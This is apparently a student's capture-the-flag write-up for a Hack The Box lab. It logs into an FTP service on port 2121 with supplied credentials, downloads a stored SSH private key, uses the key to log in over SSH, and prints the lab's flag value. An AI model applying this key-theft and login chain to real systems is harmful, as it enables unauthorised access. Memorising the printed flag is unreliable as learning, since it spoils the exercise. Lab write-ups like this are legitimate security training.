We were commissioned by the company `Inlanefreight Ltd` to test three different servers in their internal network. The company uses many different services, and the IT security department felt that a penetration test was necessary to gain insight into their overall security posture.

The first server is an internal DNS server that needs to be investigated. In particular, our client wants to know what information we can get out of these services and how this information could be used against its infrastructure. Our goal is to gather as much information as possible about the server and find ways to use that information against the company. However, our client has made it clear that it is forbidden to attack the services aggressively using exploits, as these services are in production.

Additionally, our teammates have found the following credentials "`ceil:qwer1234`", and they pointed out that some of the company's employees were talking about SSH keys on a forum.

The administrators have stored a `flag.txt` file on this server to track our progress and measure success. Fully enumerate the target and submit the contents of this file as proof.

## 10.129.193.209

### Nmap result

![[Pasted image 20241115094314.png]]

Port `2121`
![[Pasted image 20241115094443.png]]
as mentioned on the sceinrior above the password and user are `ceil:qwer1234`

we see that port `2121` is ftp so we will login into the ftp with provided credentials.
```bash
ftp 10.129.193.209 -p 2121
# username is: ceil
# password is: qwer1234
ls -la
cd .ssh
get id_rsa
quit
```
![Alt text](/Assets/attachments/Pasted image 20241115102949.png)
![Alt text](/Assets/attachments/Pasted image 20241115103133.png)
After downloading the `id_rsa` we can use it to ssh to it.
```bash
chmod 600 id_rsa
ssh -i id_rsa ceil@10.129.193.209
find / -name flat.txt 2>/dev/null
cat /home/flag/flag.txt
#HTB{7nrzise7hednrxihskjed7nzrgkweunj47zngrhdbkjhgdfbjkc7hgj}
```
![](/Assets/attachments/Pasted image 20241115103357.png)
We can submit the flag as the answer and Done!